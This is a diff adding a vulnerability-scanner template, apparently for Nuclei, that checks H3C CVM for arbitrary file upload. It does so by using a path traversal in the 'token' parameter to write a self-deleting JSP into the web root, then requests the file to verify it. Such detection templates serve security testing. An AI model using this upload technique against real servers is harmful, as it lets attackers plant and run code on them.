@@ -1,0 +1,53 @@
+id: h3c-cvm-file-upload
+info:
+  name: H3C CVM Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects an arbitrary file upload vulnerability in H3C CVM.
+  reference:
+    - https://github.com/MY0723/goby-poc/blob/goby-poc/H3C%20CVM%20Arbitrary%20File%20Upload%20Vulnerability.go
+variables:
+  random_string_a: '{{rand_text_alphanumeric(20)}}'
+  random_string_c: '{{rand_text_alphanumeric(10)}}'
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{random_string_c}}.jsp'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Content-range: bytes 0-10/20
+      Referer: '{{BaseURL}}/cas/login'
+    body: <%out.println("{{random_string_a}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: header
+        words:
+          - "H3C-CVM"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/cas/js/lib/buttons/{{random_string_c}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{random_string_a}}'
